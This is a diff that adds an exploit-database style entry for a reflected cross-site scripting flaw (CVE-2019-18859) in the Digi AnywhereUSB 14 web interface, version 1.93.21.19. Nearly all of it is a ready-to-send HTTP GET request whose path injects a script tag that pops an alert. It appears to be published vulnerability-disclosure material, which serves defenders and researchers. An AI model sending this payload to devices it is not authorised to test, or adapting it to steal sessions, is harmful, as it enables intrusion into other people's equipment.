@@ -1,0 +1,20 @@
+# Exploit Title: Digi AnywhereUSB 14 - Reflective Cross-Site Scripting
+# Date: 2019-11-10
+# Exploit Author: Raspina Net Pars Group
+# Vendor Homepage: https://www.digi.com/products/networking/usb-connectivity/usb-over-ip/awusb
+# Version: 1.93.21.19
+# CVE : CVE-2019-18859
+
+# PoC
+
+GET //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+# Author Website: HTTPS://RNPG.info
